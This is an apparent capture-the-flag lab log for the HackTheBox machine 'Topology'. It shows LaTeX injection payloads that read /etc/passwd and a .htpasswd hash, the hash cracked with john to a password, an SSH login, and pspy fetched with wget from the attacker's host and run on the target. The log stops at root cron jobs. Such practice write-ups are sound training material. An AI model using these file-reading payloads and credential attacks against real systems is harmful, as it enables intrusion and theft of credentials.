```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.11.217 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.217:22
Open 10.10.11.217:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 18:37 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:37
Completed NSE at 18:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:37
Completed NSE at 18:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:37
Completed NSE at 18:37, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:37
Completed Parallel DNS resolution of 1 host. at 18:37, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:37
Scanning 10.10.11.217 [2 ports]
Discovered open port 80/tcp on 10.10.11.217
Discovered open port 22/tcp on 10.10.11.217
Completed Connect Scan at 18:37, 0.17s elapsed (2 total ports)
Initiating Service scan at 18:37
Scanning 2 services on 10.10.11.217
Completed Service scan at 18:37, 7.81s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.217.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:37
Completed NSE at 18:38, 12.82s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 2.35s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
Nmap scan report for 10.10.11.217
Host is up, received user-set (0.17s latency).
Scanned at 2023-07-22 18:37:49 EDT for 24s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.52 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.11.217  latex.topology.htb

http://latex.topology.htb/equation.php

connection's HackTheBox is really inestable , tryhackme is more stable :)

http://latex.topology.htb/equation.php?eqn=%5Cfrac%7Bx%2B5%7D%7By-3%7D&submit=

https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection

\input{/etc/passwd}

http://latex.topology.htb/equation.php?eqn=%5Cinput%7B%2Fetc%2Fpasswd%7D&submit=

Illegal command detected 

\lstinputlisting{/etc/passwd} contain errors

$\lstinputlisting{/etc/passwd}$ works

$\lstinputlisting{/etc/hostname}$ topology

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

$\immediate\write18{id > output}$ illegal command

uhmm

$\lstinputlisting{/home/vdaisley/.bash_history}$

https://stackoverflow.com/questions/37545711/htpasswd-also-for-root-directory

$\lstinputlisting{/var/www/dev/.htpasswd}$

save image

┌──(witty㉿kali)-[~]
└─$ tesseract equation.png output_4 -l eng txt && cat output_4.txt 
Estimating resolution as 366
vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

┌──(witty㉿kali)-[~]
└─$ cat hash_latex
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

┌──(witty㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_latex
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:12 DONE (2023-07-22 19:31) 0.08278g/s 82426p/s 82426c/s 82426C/s calebd1..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~]
└─$ ssh vdaisley@10.10.11.217
The authenticity of host '10.10.11.217 (10.10.11.217)' can't be established.
ED25519 key fingerprint is SHA256:F9cjnqv7HiOrntVKpXYGmE9oEaCfHm5pjfgayE/0OK0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.217' (ED25519) to the list of known hosts.
vdaisley@10.10.11.217's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

vdaisley@topology:~$ ls
user.txt
vdaisley@topology:~$ cat user.txt 
01e92f9d4ba9bd0cb21a97a03e5bde8f
vdaisley@topology:~$ sudo -l
[sudo] password for vdaisley: 
Sorry, user vdaisley may not run sudo on topology.

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.217 - - [22/Jul/2023 19:33:35] "GET /pspy64 HTTP/1.1" 200 -

vdaisley@topology:~$ cd /tmp
vdaisley@topology:/tmp$ wget http://10.10.14.19/pspy64
--2023-07-22 19:33:36--  http://10.10.14.19/pspy64
Connecting to 10.10.14.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64               100%[====================>]   2.96M   425KB/s    in 9.5s    

2023-07-22 19:33:46 (320 KB/s) - ‘pspy64’ saved [3104768/3104768]

vdaisley@topology:/tmp$ chmod +x pspy64
vdaisley@topology:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/07/22 19:34:05 CMD: UID=33    PID=2788   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2787   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=1007  PID=2760   | ./pspy64 
2023/07/22 19:34:05 CMD: UID=33    PID=2759   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2757   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2756   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2755   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2754   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2751   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2750   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2749   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2748   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2747   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2746   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2745   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2726   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2725   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2724   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2723   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2722   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2715   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=1007  PID=2701   | -bash 
2023/07/22 19:34:05 CMD: UID=1007  PID=2699   | sshd: vdaisley@pts/0 
2023/07/22 19:34:05 CMD: UID=1007  PID=2665   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/07/22 19:34:05 CMD: UID=113   PID=2635   | /usr/libexec/rtkit-daemon 
2023/07/22 19:34:05 CMD: UID=1007  PID=2614   | /usr/bin/pulseaudio --daemonize=no --log-target=journal 
2023/07/22 19:34:05 CMD: UID=0     PID=2611   | 
2023/07/22 19:34:05 CMD: UID=0     PID=2608   | 
2023/07/22 19:34:05 CMD: UID=1007  PID=2607   | (sd-pam) 
2023/07/22 19:34:05 CMD: UID=1007  PID=2602   | /lib/systemd/systemd --user 
2023/07/22 19:34:05 CMD: UID=33    PID=2583   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=0     PID=2573   | sshd: vdaisley [priv] 
2023/07/22 19:34:05 CMD: UID=33    PID=2572   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2551   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2548   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2547   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2545   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2525   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2523   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2522   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2521   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2520   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2497   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2495   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=0     PID=2470   | 
2023/07/22 19:34:05 CMD: UID=33    PID=2468   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2443   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2424   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2422   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2369   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2366   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2365   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2364   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=33    PID=2342   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=0     PID=2341   | 
2023/07/22 19:34:05 CMD: UID=33    PID=2227   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=0     PID=2166   | 
2023/07/22 19:34:05 CMD: UID=33    PID=2149   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=0     PID=1720   | 
2023/07/22 19:34:05 CMD: UID=0     PID=1712   | 
2023/07/22 19:34:05 CMD: UID=0     PID=1519   | 
2023/07/22 19:34:05 CMD: UID=101   PID=1150   | /lib/systemd/systemd-resolved 
2023/07/22 19:34:05 CMD: UID=0     PID=966    | /usr/sbin/apache2 -k start 
2023/07/22 19:34:05 CMD: UID=0     PID=964    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/07/22 19:34:05 CMD: UID=0     PID=954    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/07/22 19:34:05 CMD: UID=1     PID=953    | /usr/sbin/atd -f 
2023/07/22 19:34:05 CMD: UID=0     PID=952    | /usr/bin/python3 /usr/bin/fail2ban-server -xf start 
2023/07/22 19:34:05 CMD: UID=0     PID=938    | /usr/sbin/cron -f 
2023/07/22 19:34:05 CMD: UID=0     PID=811    | /usr/sbin/ModemManager 
2023/07/22 19:34:05 CMD: UID=117   PID=765    | avahi-daemon: chroot helper 
2023/07/22 19:34:05 CMD: UID=0     PID=758    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant 
2023/07/22 19:34:05 CMD: UID=0     PID=757    | /usr/lib/udisks2/udisksd 
2023/07/22 19:34:05 CMD: UID=0     PID=756    | /lib/systemd/systemd-logind 
2023/07/22 19:34:05 CMD: UID=104   PID=754    | /usr/sbin/rsyslogd -n -iNONE 
2023/07/22 19:34:05 CMD: UID=0     PID=747    | /usr/lib/policykit-1/polkitd --no-debug 
2023/07/22 19:34:05 CMD: UID=0     PID=746    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/07/22 19:34:05 CMD: UID=0     PID=745    | /usr/sbin/irqbalance --foreground 
2023/07/22 19:34:05 CMD: UID=0     PID=738    | /usr/sbin/NetworkManager --no-daemon 
2023/07/22 19:34:05 CMD: UID=103   PID=737    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/07/22 19:34:05 CMD: UID=117   PID=736    | avahi-daemon: running [topology.local] 
2023/07/22 19:34:05 CMD: UID=0     PID=735    | /usr/lib/accountsservice/accounts-daemon 
2023/07/22 19:34:05 CMD: UID=0     PID=684    | 
2023/07/22 19:34:05 CMD: UID=0     PID=680    | /usr/bin/vmtoolsd 
2023/07/22 19:34:05 CMD: UID=0     PID=678    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2023/07/22 19:34:05 CMD: UID=0     PID=677    | /usr/bin/VGAuthService 
2023/07/22 19:34:05 CMD: UID=102   PID=629    | /lib/systemd/systemd-timesyncd 
2023/07/22 19:34:05 CMD: UID=0     PID=623    | /sbin/auditd 
2023/07/22 19:34:05 CMD: UID=0     PID=595    | /sbin/multipathd -d -s 
2023/07/22 19:34:05 CMD: UID=0     PID=594    | 
2023/07/22 19:34:05 CMD: UID=0     PID=593    | 
2023/07/22 19:34:05 CMD: UID=0     PID=592    | 
2023/07/22 19:34:05 CMD: UID=0     PID=591    | 
2023/07/22 19:34:05 CMD: UID=0     PID=495    | /lib/systemd/systemd-udevd 
2023/07/22 19:34:05 CMD: UID=0     PID=467    | /lib/systemd/systemd-journald 
2023/07/22 19:34:05 CMD: UID=0     PID=446    | 
2023/07/22 19:34:05 CMD: UID=0     PID=412    | 
2023/07/22 19:34:05 CMD: UID=0     PID=411    | 
2023/07/22 19:34:05 CMD: UID=0     PID=360    | 
2023/07/22 19:34:05 CMD: UID=0     PID=332    | 
2023/07/22 19:34:05 CMD: UID=0     PID=331    | 
2023/07/22 19:34:05 CMD: UID=0     PID=330    | 
2023/07/22 19:34:05 CMD: UID=0     PID=301    | 
2023/07/22 19:34:05 CMD: UID=0     PID=300    | 
2023/07/22 19:34:05 CMD: UID=0     PID=299    | 
2023/07/22 19:34:05 CMD: UID=0     PID=298    | 
2023/07/22 19:34:05 CMD: UID=0     PID=297    | 
2023/07/22 19:34:05 CMD: UID=0     PID=296    | 
2023/07/22 19:34:05 CMD: UID=0     PID=295    | 
2023/07/22 19:34:05 CMD: UID=0     PID=294    | 
2023/07/22 19:34:05 CMD: UID=0     PID=293    | 
2023/07/22 19:34:05 CMD: UID=0     PID=292    | 
2023/07/22 19:34:05 CMD: UID=0     PID=291    | 
2023/07/22 19:34:05 CMD: UID=0     PID=290    | 
2023/07/22 19:34:05 CMD: UID=0     PID=289    | 
2023/07/22 19:34:05 CMD: UID=0     PID=288    | 
2023/07/22 19:34:05 CMD: UID=0     PID=287    | 
2023/07/22 19:34:05 CMD: UID=0     PID=286    | 
2023/07/22 19:34:05 CMD: UID=0     PID=285    | 
2023/07/22 19:34:05 CMD: UID=0     PID=284    | 
2023/07/22 19:34:05 CMD: UID=0     PID=283    | 
2023/07/22 19:34:05 CMD: UID=0     PID=282    | 
2023/07/22 19:34:05 CMD: UID=0     PID=281    | 
2023/07/22 19:34:05 CMD: UID=0     PID=280    | 
2023/07/22 19:34:05 CMD: UID=0     PID=279    | 
2023/07/22 19:34:05 CMD: UID=0     PID=278    | 
2023/07/22 19:34:05 CMD: UID=0     PID=277    | 
2023/07/22 19:34:05 CMD: UID=0     PID=276    | 
2023/07/22 19:34:05 CMD: UID=0     PID=275    | 
2023/07/22 19:34:05 CMD: UID=0     PID=274    | 
2023/07/22 19:34:05 CMD: UID=0     PID=273    | 
2023/07/22 19:34:05 CMD: UID=0     PID=272    | 
2023/07/22 19:34:05 CMD: UID=0     PID=271    | 
2023/07/22 19:34:05 CMD: UID=0     PID=270    | 
2023/07/22 19:34:05 CMD: UID=0     PID=269    | 
2023/07/22 19:34:05 CMD: UID=0     PID=268    | 
2023/07/22 19:34:05 CMD: UID=0     PID=267    | 
2023/07/22 19:34:05 CMD: UID=0     PID=266    | 
2023/07/22 19:34:05 CMD: UID=0     PID=265    | 
2023/07/22 19:34:05 CMD: UID=0     PID=264    | 
2023/07/22 19:34:05 CMD: UID=0     PID=263    | 
2023/07/22 19:34:05 CMD: UID=0     PID=262    | 
2023/07/22 19:34:05 CMD: UID=0     PID=261    | 
2023/07/22 19:34:05 CMD: UID=0     PID=260    | 
2023/07/22 19:34:05 CMD: UID=0     PID=257    | 
2023/07/22 19:34:05 CMD: UID=0     PID=254    | 
2023/07/22 19:34:05 CMD: UID=0     PID=243    | 
2023/07/22 19:34:05 CMD: UID=0     PID=242    | 
2023/07/22 19:34:05 CMD: UID=0     PID=232    | 
2023/07/22 19:34:05 CMD: UID=0     PID=230    | 
2023/07/22 19:34:05 CMD: UID=0     PID=228    | 
2023/07/22 19:34:05 CMD: UID=0     PID=227    | 
2023/07/22 19:34:05 CMD: UID=0     PID=221    | 
2023/07/22 19:34:05 CMD: UID=0     PID=217    | 
2023/07/22 19:34:05 CMD: UID=0     PID=215    | 
2023/07/22 19:34:05 CMD: UID=0     PID=214    | 
2023/07/22 19:34:05 CMD: UID=0     PID=213    | 
2023/07/22 19:34:05 CMD: UID=0     PID=212    | 
2023/07/22 19:34:05 CMD: UID=0     PID=211    | 
2023/07/22 19:34:05 CMD: UID=0     PID=210    | 
2023/07/22 19:34:05 CMD: UID=0     PID=209    | 
2023/07/22 19:34:05 CMD: UID=0     PID=208    | 
2023/07/22 19:34:05 CMD: UID=0     PID=207    | 
2023/07/22 19:34:05 CMD: UID=0     PID=206    | 
2023/07/22 19:34:05 CMD: UID=0     PID=205    | 
2023/07/22 19:34:05 CMD: UID=0     PID=204    | 
2023/07/22 19:34:05 CMD: UID=0     PID=203    | 
2023/07/22 19:34:05 CMD: UID=0     PID=202    | 
2023/07/22 19:34:05 CMD: UID=0     PID=157    | 
2023/07/22 19:34:05 CMD: UID=0     PID=144    | 
2023/07/22 19:34:05 CMD: UID=0     PID=141    | 
2023/07/22 19:34:05 CMD: UID=0     PID=132    | 
2023/07/22 19:34:05 CMD: UID=0     PID=130    | 
2023/07/22 19:34:05 CMD: UID=0     PID=128    | 
2023/07/22 19:34:05 CMD: UID=0     PID=127    | 
2023/07/22 19:34:05 CMD: UID=0     PID=126    | 
2023/07/22 19:34:05 CMD: UID=0     PID=125    | 
2023/07/22 19:34:05 CMD: UID=0     PID=124    | 
2023/07/22 19:34:05 CMD: UID=0     PID=123    | 
2023/07/22 19:34:05 CMD: UID=0     PID=122    | 
2023/07/22 19:34:05 CMD: UID=0     PID=121    | 
2023/07/22 19:34:05 CMD: UID=0     PID=120    | 
2023/07/22 19:34:05 CMD: UID=0     PID=119    | 
2023/07/22 19:34:05 CMD: UID=0     PID=118    | 
2023/07/22 19:34:05 CMD: UID=0     PID=117    | 
2023/07/22 19:34:05 CMD: UID=0     PID=116    | 
2023/07/22 19:34:05 CMD: UID=0     PID=115    | 
2023/07/22 19:34:05 CMD: UID=0     PID=114    | 
2023/07/22 19:34:05 CMD: UID=0     PID=113    | 
2023/07/22 19:34:05 CMD: UID=0     PID=112    | 
2023/07/22 19:34:05 CMD: UID=0     PID=111    | 
2023/07/22 19:34:05 CMD: UID=0     PID=110    | 
2023/07/22 19:34:05 CMD: UID=0     PID=109    | 
2023/07/22 19:34:05 CMD: UID=0     PID=108    | 
2023/07/22 19:34:05 CMD: UID=0     PID=107    | 
2023/07/22 19:34:05 CMD: UID=0     PID=106    | 
2023/07/22 19:34:05 CMD: UID=0     PID=105    | 
2023/07/22 19:34:05 CMD: UID=0     PID=104    | 
2023/07/22 19:34:05 CMD: UID=0     PID=103    | 
2023/07/22 19:34:05 CMD: UID=0     PID=102    | 
2023/07/22 19:34:05 CMD: UID=0     PID=101    | 
2023/07/22 19:34:05 CMD: UID=0     PID=100    | 
2023/07/22 19:34:05 CMD: UID=0     PID=99     | 
2023/07/22 19:34:05 CMD: UID=0     PID=98     | 
2023/07/22 19:34:05 CMD: UID=0     PID=97     | 
2023/07/22 19:34:05 CMD: UID=0     PID=96     | 
2023/07/22 19:34:05 CMD: UID=0     PID=95     | 
2023/07/22 19:34:05 CMD: UID=0     PID=94     | 
2023/07/22 19:34:05 CMD: UID=0     PID=93     | 
2023/07/22 19:34:05 CMD: UID=0     PID=92     | 
2023/07/22 19:34:05 CMD: UID=0     PID=91     | 
2023/07/22 19:34:05 CMD: UID=0     PID=89     | 
2023/07/22 19:34:05 CMD: UID=0     PID=88     | 
2023/07/22 19:34:05 CMD: UID=0     PID=85     | 
2023/07/22 19:34:05 CMD: UID=0     PID=84     | 
2023/07/22 19:34:05 CMD: UID=0     PID=83     | 
2023/07/22 19:34:05 CMD: UID=0     PID=82     | 
2023/07/22 19:34:05 CMD: UID=0     PID=81     | 
2023/07/22 19:34:05 CMD: UID=0     PID=80     | 
2023/07/22 19:34:05 CMD: UID=0     PID=79     | 
2023/07/22 19:34:05 CMD: UID=0     PID=78     | 
2023/07/22 19:34:05 CMD: UID=0     PID=77     | 
2023/07/22 19:34:05 CMD: UID=0     PID=30     | 
2023/07/22 19:34:05 CMD: UID=0     PID=29     | 
2023/07/22 19:34:05 CMD: UID=0     PID=28     | 
2023/07/22 19:34:05 CMD: UID=0     PID=27     | 
2023/07/22 19:34:05 CMD: UID=0     PID=26     | 
2023/07/22 19:34:05 CMD: UID=0     PID=25     | 
2023/07/22 19:34:05 CMD: UID=0     PID=24     | 
2023/07/22 19:34:05 CMD: UID=0     PID=23     | 
2023/07/22 19:34:05 CMD: UID=0     PID=22     | 
2023/07/22 19:34:05 CMD: UID=0     PID=21     | 
2023/07/22 19:34:05 CMD: UID=0     PID=20     | 
2023/07/22 19:34:05 CMD: UID=0     PID=18     | 
2023/07/22 19:34:05 CMD: UID=0     PID=17     | 
2023/07/22 19:34:05 CMD: UID=0     PID=16     | 
2023/07/22 19:34:05 CMD: UID=0     PID=15     | 
2023/07/22 19:34:05 CMD: UID=0     PID=14     | 
2023/07/22 19:34:05 CMD: UID=0     PID=12     | 
2023/07/22 19:34:05 CMD: UID=0     PID=11     | 
2023/07/22 19:34:05 CMD: UID=0     PID=10     | 
2023/07/22 19:34:05 CMD: UID=0     PID=9      | 
2023/07/22 19:34:05 CMD: UID=0     PID=8      | 
2023/07/22 19:34:05 CMD: UID=0     PID=6      | 
2023/07/22 19:34:05 CMD: UID=0     PID=4      | 
2023/07/22 19:34:05 CMD: UID=0     PID=3      | 
2023/07/22 19:34:05 CMD: UID=0     PID=2      | 
2023/07/22 19:34:05 CMD: UID=0     PID=1      | /sbin/init 
2023/07/22 19:34:07 CMD: UID=0     PID=2789   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:12 CMD: UID=33    PID=2790   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:15 CMD: UID=0     PID=2792   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:25 CMD: UID=33    PID=2793   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:26 CMD: UID=0     PID=2795   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:26 CMD: UID=0     PID=2794   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:28 CMD: UID=0     PID=2796   | 
2023/07/22 19:34:36 CMD: UID=0     PID=2797   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:42 CMD: UID=33    PID=2798   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:55 CMD: UID=0     PID=2799   | /usr/sbin/apache2 -k start 
2023/07/22 19:34:58 CMD: UID=0     PID=2800   | /usr/sbin/apache2 -k start 
2023/07/22 19:35:01 CMD: UID=0     PID=2801   | /usr/sbin/apache2 -k start 
2023/07/22 19:35:01 CMD: UID=0     PID=2804   | /usr/sbin/CRON -f 
2023/07/22 19:35:01 CMD: UID=0     PID=2803   | /usr/sbin/CRON -f 
2023/07/22 19:35:01 CMD: UID=0     PID=2802   | /usr/sbin/CRON -f 
2023/07/22 19:35:01 CMD: UID=0     PID=2812   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023/07/22 19:35:01 CMD: UID=0     PID=2811   | cut -d   -f3,7 
2023/07/22 19:35:01 CMD: UID=0     PID=2810   | tr -s   
2023/07/22 19:35:01 CMD: UID=0     PID=2809   | grep enp 
2023/07/22 19:35:01 CMD: UID=0     PID=2807   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023/07/22 19:35:01 CMD: UID=0     PID=2806   | /bin/sh /opt/gnuplot/getdata.sh 
2023/07/22 19:35:01 CMD: UID=0     PID=2805   | /bin/sh -c /opt/gnuplot/getdata.sh 
